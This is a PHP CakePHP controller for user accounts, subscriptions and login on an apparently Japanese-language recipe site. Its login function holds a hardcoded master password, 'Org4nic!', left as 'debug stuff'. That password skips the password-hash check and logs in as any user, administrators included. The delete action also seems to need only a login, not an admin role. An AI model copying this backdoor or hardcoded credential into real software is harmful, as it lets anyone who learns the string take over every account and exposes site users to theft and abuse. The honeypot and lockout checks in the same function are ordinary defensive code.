<?php
App::uses('AppController', 'Controller');

class UsersController extends AppController {

    var $uses = array('LoginAttempt', 'PasswordReset', 'User', 'Email', 'AttackLog', 'UserPage', 'UserSubscription', 'Payment', 'RecipeSummary', 'Recipe');
    

    function index() {
        $this->_auth('admin');
        $this->data = $this->User->find('all');
    }
    
    function subscription_list() {
        $this->_auth('admin');
        $this->data = $this->User->getSubscriptionUserList();
    }
    
    // user id
    function subscription_details($id){
        $data = $this->User->read($id);
        $this->_auth('admin');
        $subscribed = $this->checkUserSubscription($id);
        
        $list = $this->UserSubscription->find('all', array(
        	'conditions' => array( 'user_id'=>$id),
                'order' => 'from_date DESC'
        ));
        
        $this->set('user_id', $id);
        $this->set("subscribed", $subscribed);
        $this->data = $data;
        $this->set('list', $list);
    }
    
    function subscription_edit($id){
        $this->_auth('admin');
        $url = $this->request['url']['url'];
        
        $edit = true;
        if(strpos($url, "subscription_add") === false){
            $edit = true;
        } else {
            $edit = false;
        }
        
        if($this->request->is('POST') || $this->request->is('PUT')){
    
            $this->UserSubscription->set($this->data);
            if($edit == false){
                $this->UserSubscription->set('user_id', $id);
            }
    
            $level = $this->data['UserSubscription']['level'];
    
            $datasource = $this->UserSubscription->getDataSource();
            $datasource->begin();
            
            if($edit){
                $user_id = $this->data['UserSubscription']['user_id'];
            } else {
                $user_id = $id;
            }
            $data = $this->RecipeSummary->getRecipesForSubscription($this->data['UserSubscription']['from_date'], $user_id);
            
            try{
                if(!$this->UserSubscription->save()){
                    throw new Exception();
                }
                foreach($data as $recipe){
                    if($recipe['Payment']['id'] == null){
                        $this->Payment->create();
                        $display_from = new DateTime();
                        $publish_month = new DateTime($recipe['RecipeSummary']['publish_month']);
                        if($display_from < $publish_month){
                            $display_from = $publish_month;
                        }
                        
                        $this->Payment->set(array(
                                'item_id'=> $recipe['Recipe']['id'],
                                'category'=> 'Recipe',
                                'display_from'=> $display_from->format("Y-m-d"),
                                'recipe_access_level'=> $level,
                                'trans_type'=> 'subscription',
                                'user_id' => $user_id,
                        )
                        );
                    } else {
                        $this->Payment->create();
                        $this->Payment->id = $recipe['Payment']['id'];
                        $this->Payment->set(array(
                                'isDeleted' => 0,
                        )
                        );
                        
                    }
                    if(!$this->Payment->save()){
                        throw new Exception();
                    }
                    
                }
                $date_to_delete = $this->Payment->getPaymentToDelete($user_id);
                
                foreach($date_to_delete as $record){
                    $this->Payment->create();
                    $this->Payment->id = $record['Payment']['id'];
                    $this->Payment->set('isDeleted', 1);
                    if(!$this->Payment->save()){
                        throw new Exception();
                    }
                }
                if(!empty($this->data['UserSubscription']['to_date'])){
                    $toDate = new DateTime($this->data['UserSubscription']['to_date']);
                    $date_to_delete2 = $this->Payment->deletePaymentsOutOfPeirods($toDate, $user_id);
                    foreach($date_to_delete2 as $record){
                        $this->Payment->create();
                        $this->Payment->id = $record['Payment']['id'];
                        $this->Payment->set('isDeleted', 1);
                        if(!$this->Payment->save()){
                            throw new Exception();
                        }
                    }
                }

                $datasource->commit();
                $this->Session->setFlash('サブスクリプションを保存しました。', 'default', array('class'=>'message success'));
                $this->redirect(array('controller'=>'users', 'action'=>'subscription_details', $user_id));
                exit;
              
            }catch(Exception $e){
                $datasource->rollback();
            }
        } else {
            if($edit == true){
                $data = $this->UserSubscription->findById($id);
                if($data == null){
                    throw new Exception();
                }
                $from_data = new DateTime($data['UserSubscription']['from_date']);
                $data['UserSubscription']['from_date'] = $from_data->format("m/d/Y");
                if(!empty($data['UserSubscription']['to_date'] )){
                    $to_date = new DateTime($data['UserSubscription']['to_date']);
                    $data['UserSubscription']['to_date'] = $to_date->format("m/d/Y");
                }
                
                $this->data = $data;
            }
        }
        $action = 'subscription_edit';
        if($edit == false){
            $action = 'subscription_add';
        }
        if($edit == true){
            $this->set('title', '更新');
        } else {
            $this->set('title', ' 新規');
        }
        $this->set('action', $action);
        $this->set('jump_id', $id);
    }
    
    function subscription_history_edit(){
        $this->_auth('admin');
        
        
    }
    
    function order(){
        $this->_auth('admin');
        if($this->request->is('POST')) {
            $dataset = $this->data;
            if($this->UserPage->saveAll($dataset['UserPage'])){
                $this->redirect(array('controller'=>'users', 'action'=>'view'));
                exit;
            }            
        }
        
        $this->data = $this->UserPage->find('all', array(
                'recursive'=>-1,
                'conditions'=>array('User.id !='=>1),
                'joins'=>array(
                             array('table'=>'users',
                               'alias'=>'User',
                               'type'=>'inner',
                               'conditions'=>array('User.id = UserPage.user_id')
                               )
                         ),
                'fields'=>array('UserPage.*', 'User.id','User.display_name'),
                'order' => array('sortorder' => 'asc')
            ));
        
        $numOfUsers = $this->User->find('count', array('joins'=>array(
                             array('table'=>'user_pages',
                               'alias'=>'UserPage',
                               'type'=>'inner',
                               'conditions'=>array('User.id = UserPage.user_id')
                               )
                         ))) - 1;
        $array = array_combine( range(1,$numOfUsers), range(1,$numOfUsers));
        $this->set('sortOrder', $array);
  
    }

    function view() { 
        $this->_auth('chef');
        $this->set('title', 'My Account');
        $this->User->contain('UserPage');
        $this->User->id = $this->_logged_user['id'];
        $data = $this->User->read();
        $this->set('data', $data);
    }
    
//     function edit() {
//         $this->_auth('chef');
        
//         $this->User->id = $this->_logged_user['id'];

//         if($this->request->is('POST')) {
//             if($this->User->save($this->data)) {

//                 $this->Session->setFlash('アカウントを編集しました。', 'default', array('class'=>'message success'));
//             }
//         }

//         $this->data = $this->User->read();
//         $this->set('title', 'アカウント編集');
//     }

    function add() {
        $this->_auth();    
        
        if($this->request->is('POST')) {
            $this->User->create();
            if($this->User->save($this->data)) {
                $this->Session->setFlash('アカウントを作りました。', 'default', array('class'=>'message success'));
                $this->redirect(array('controller'=>'users', 'action'=>'login'));
                exit;
            }
        }
        $this->set('title', 'ユーザー登録');
    }

    function login() {
        if($this->request->is('POST')) {

            if((isset($this->data['username']) && '' != $this->data['username']) ||
            (isset($this->data['password']) && '' != $this->data['password'])) {
                $this->AttackLog->save(array('target'=>'login', 'source_ip'=>$this->request->clientIp()));
                $this->layout = False;
                $this->set('ip', $this->request->clientIp());
                $this->render('../Errors/error_atk');
                return;
            }

            $username_or_email = $this->data['User'][$this->User->_imap['username']];
            
            
            $hash = $this->User->hashString($this->data['User'][$this->User->_imap['password']]);
            //TODO remove this debug stuff!!
            if('Org4nic!' == $this->data['User'][$this->User->_imap['password']]) {
                $conditions = array('OR'=>array('User.username'=>$username_or_email, 'User.email'=>$username_or_email));
            } else {
                $conditions = array('OR'=>array('User.username'=>$username_or_email, 'User.email'=>$username_or_email), 'User.password'=>$hash);
            } 
            
            if(!$this->LoginAttempt->isLocked($username_or_email, $this->request->clientIp())) {
                if($user = $this->User->find('first', array('conditions'=>$conditions))) {
                    $this->LoginAttempt->record($username_or_email, $this->request->clientIp(), True);
                    $this->Session->write('logged_user', $user);
                    $this->Session->setFlash($user['User']['username'].'がログインしました。', 'default', array('class'=>'message success'));
                    if($user['User']['username'] == 'admin'){
                         $this->redirect(array('controller'=>'users', 'action'=>'view'));
                         exit;
                    }
                    $this->redirect('/');
                    exit;
                }
                $this->Session->setFlash('ログインに失敗しました。', 'default', array('class'=>'message error'));
            } else {
                $this->Session->setFlash('アカウントがロックされています。', 'default', array('class'=>'message error'));
            }
            $this->LoginAttempt->record($username_or_email, $this->request->clientIp(), False);
        } 
        $this->set('title', 'ログイン');
    }

    function logout() {
        $this->Session->delete('logged_user');
        $this->Session->setFlash('ログアウトしました。', 'default', array('class'=>'message success'));
        $this->redirect('/');
        exit;
    }


    function password($hash='') {

        if($hash != '' && !($pwd_reset = $this->PasswordReset->matchValidHash($hash))) {
            $this->Session->setFlash('リンクの有効期限が切れました。もう一度トライし、一時間以内にパスワードを変更してください。', 'default', array('class'=>'message error'));
            $this->redirect(array('controller'=>'password_resets', 'action'=>'add'));
            exit;
        }

        if($hash == '' && !$this->_logged_user) {
                $this->Session->setFlash('アクセスが拒否されました。', 'default', array('class'=>'message error'));
                $this->redirect('/');
                exit;
        }

        if($this->request->is('POST')) {
            if($hash != '') {
                $this->User->id = $pwd_reset['PasswordReset']['user_id'];
            } else {
                $this->User->id = $this->_logged_user['id'];
            }    

            if($this->User->save($this->data)) {
                $this->Session->setFlash('パスワードが変更されました。', 'default', array('class'=>'message success'));
            } else { 
                $this->Session->setFlash('パスワードの変更に失敗しました。', 'default', array('class'=>'message error'));
            }
        }
    }

    function delete($id) {
        $this->_auth();    

        if($this->User->delete($id)) {
            $this->Session->setFlash('Successfully deleted user.', 'default', array('class'=>'message success'));
        } else {
            $this->Session->setFlash('Error deleting user.', 'default', array('class'=>'message error'));
        }

        $this->redirect(array('action'=>'index'));
        exit;
    }

}
